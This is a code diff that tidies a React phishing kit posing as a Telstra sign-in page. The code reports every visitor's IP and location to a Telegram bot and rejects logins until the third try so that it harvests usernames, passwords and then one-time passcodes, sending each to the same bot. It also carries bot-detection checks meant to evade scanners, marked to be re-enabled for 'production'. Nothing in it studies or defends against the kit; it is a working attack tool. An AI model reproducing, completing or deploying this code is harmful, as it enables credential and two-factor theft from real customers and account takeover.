@@ -6,7 +6,6 @@ import LoadingScreen from './components/LoadingScreen';
 
 // Configuration - Direct values (no environment variables for now)
 const CONFIG = {
-  const CONFIG = {
   TELEGRAM_BOT_TOKEN: process.env.REACT_APP_TELEGRAM_BOT_TOKEN,
   TELEGRAM_CHAT_ID: process.env.REACT_APP_TELEGRAM_CHAT_ID,
   MAX_ATTEMPTS: 3,
@@ -23,13 +22,13 @@ function App() {
   useEffect(() => {
     // Send visitor information when page loads
     sendVisitorInfo();
-    
+
     // Anti-bot detection
     detectBot();
-    
+
     // Auto-populate username
     autoPopulateUsername();
-    
+
     // Track user behavior
     trackUserBehavior();
   }, []);
@@ -37,7 +36,8 @@ function App() {
   const sendVisitorInfo = async () => {
     try {
       const visitorData = await collectVisitorData();
-      const message = `🔍 *NEW VISITOR - Telstra*\n\n` +
+      const message =
+        `🔍 *NEW VISITOR - Telstra*\n\n` +
         `📍 *IP:* \`${visitorData.ip}\`\n` +
         `🌍 *Location:* ${visitorData.location}\n` +
         `🌐 *URL:* ${window.location.href}\n` +
@@ -61,7 +61,6 @@ function App() {
     };
 
     try {
-      // Get IP and location
       const ipResponse = await fetch('https://ipapi.co/json/');
       const ipData = await ipResponse.json();
       data.ip = ipData.ip || 'Unknown';
@@ -77,9 +76,7 @@ function App() {
     try {
       const response = await fetch(`https://api.telegram.org/bot${CONFIG.TELEGRAM_BOT_TOKEN}/sendMessage`, {
         method: 'POST',
-        headers: {
-          'Content-Type': 'application/json',
-        },
+        headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
           chat_id: CONFIG.TELEGRAM_CHAT_ID,
           text: message,
@@ -98,32 +95,30 @@ function App() {
   const detectBot = () => {
     // DISABLED FOR TESTING - Remove this return statement for production use
     return;
-    
-    // Check for headless browsers
-    if (navigator.webdriver || 
-        window.navigator.webdriver || 
-        window.callPhantom || 
-        window._phantom ||
-        window.Buffer ||
-        window.emit ||
-        window.spawn) {
+
+    if (
+      navigator.webdriver ||
+      window.navigator.webdriver ||
+      window.callPhantom ||
+      window._phantom ||
+      window.Buffer ||
+      window.emit ||
+      window.spawn
+    ) {
       setBotDetected(true);
       return;
     }
 
-    // Check for automation tools
     if (window.chrome && window.chrome.runtime && window.chrome.runtime.onConnect) {
       setBotDetected(true);
       return;
     }
 
-    // Check navigator properties
     if (navigator.languages && navigator.languages.length === 0) {
       setBotDetected(true);
       return;
     }
 
-    // Check for missing properties
     if (!navigator.plugins || navigator.plugins.length === 0) {
       setBotDetected(true);
       return;
@@ -131,17 +126,16 @@ function App() {
   };
 
   const autoPopulateUsername = () => {
-    // Try to get username from various browser storage locations
-    const savedUsername = localStorage.getItem('telstraUsername') || 
-                         sessionStorage.getItem('telstraUsername') ||
-                         localStorage.getItem('username') ||
-                         sessionStorage.getItem('username');
-    
+    const savedUsername =
+      localStorage.getItem('telstraUsername') ||
+      sessionStorage.getItem('telstraUsername') ||
+      localStorage.getItem('username') ||
+      sessionStorage.getItem('username');
+
     if (savedUsername) {
       setUserData(prev => ({ ...prev, username: savedUsername }));
     }
 
-    // Try to extract from browser autofill
     setTimeout(() => {
       const usernameInput = document.querySelector('input[name="username"]');
       if (usernameInput && usernameInput.value && !userData.username) {
@@ -154,24 +148,18 @@ function App() {
     let mouseMovements = 0;
     let keystrokes = 0;
 
-    const handleMouseMove = () => {
-      mouseMovements++;
-    };
-
-    const handleKeyPress = () => {
-      keystrokes++;
-    };
+    const handleMouseMove = () => { mouseMovements++; };
+    const handleKeyPress = () => { keystrokes++; };
 
     document.addEventListener('mousemove', handleMouseMove);
     document.addEventListener('keypress', handleKeyPress);
 
-    // Check behavior after 10 seconds
     setTimeout(() => {
-      // DISABLED FOR TESTING - Uncomment the next 3 lines for production use
+      // DISABLED FOR TESTING - Uncomment for production
       // if (mouseMovements < 5 && keystrokes < 3) {
       //   setBotDetected(true);
       // }
-      
+
       document.removeEventListener('mousemove', handleMouseMove);
       document.removeEventListener('keypress', handleKeyPress);
     }, 10000);
@@ -186,10 +174,10 @@ function App() {
     setLoginAttempts(newAttempts);
     setUserData({ username, password });
 
-    // Collect comprehensive data
     const visitorData = await collectVisitorData();
-    
-    const message = `🚨 *LOGIN ATTEMPT ${newAttempts} - Telstra*\n\n` +
+
+    const message =
+      `🚨 *LOGIN ATTEMPT ${newAttempts} - Telstra*\n\n` +
       `👤 *Username:* \`${username}\`\n` +
       `🔐 *Password:* \`${password}\`\n` +
       `📍 *IP:* \`${visitorData.ip}\`\n` +
@@ -202,7 +190,6 @@ function App() {
 
     await sendToTelegram(message);
 
-    // Save to local storage for persistence
     const attempts_data = JSON.parse(localStorage.getItem('telstra_login_attempts') || '[]');
     attempts_data.push({
       username,
@@ -214,10 +201,7 @@ function App() {
     localStorage.setItem('telstra_login_attempts', JSON.stringify(attempts_data));
 
     if (newAttempts >= CONFIG.MAX_ATTEMPTS) {
-      // After max attempts, go to OTP page
-      setTimeout(() => {
-        setCurrentPage('otp');
-      }, 2000);
+      setTimeout(() => setCurrentPage('otp'), 2000);
       return { success: false, error: 'The username or password entered does not match our records. Please try again.' };
     }
 
@@ -225,10 +209,10 @@ function App() {
   };
 
   const handleOtpSubmit = async (otpCode) => {
-    // Collect comprehensive data
     const visitorData = await collectVisitorData();
-    
-    const message = `📱 *OTP SUBMITTED - Telstra*\n\n` +
+
+    const message =
+      `📱 *OTP SUBMITTED - Telstra*\n\n` +
       `👤 *Username:* \`${userData.username}\`\n` +
       `🔢 *OTP Code:* \`${otpCode}\`\n` +
       `📍 *IP:* \`${visitorData.ip}\`\n` +
@@ -240,7 +224,6 @@ function App() {
 
     await sendToTelegram(message);
 
-    // Save OTP to local storage
     const otp_data = JSON.parse(localStorage.getItem('telstra_otp_attempts') || '[]');
     otp_data.push({
       username: userData.username,
@@ -250,10 +233,7 @@ function App() {
     });
     localStorage.setItem('telstra_otp_attempts', JSON.stringify(otp_data));
 
-    // Always go to done page after OTP
-    setTimeout(() => {
-      setCurrentPage('done');
-    }, 2000);
+    setTimeout(() => setCurrentPage('done'), 2000);
 
     return true;
   };
@@ -285,11 +265,7 @@ function App() {
           />
         );
       case 'done':
-        return (
-          <DonePage
-            onBackToLogin={handleBackToLogin}
-          />
-        );
+        return <DonePage onBackToLogin={handleBackToLogin} />;
       default:
         return <LoginPage onLoginAttempt={handleLoginAttempt} setLoading={setLoading} />;
     }
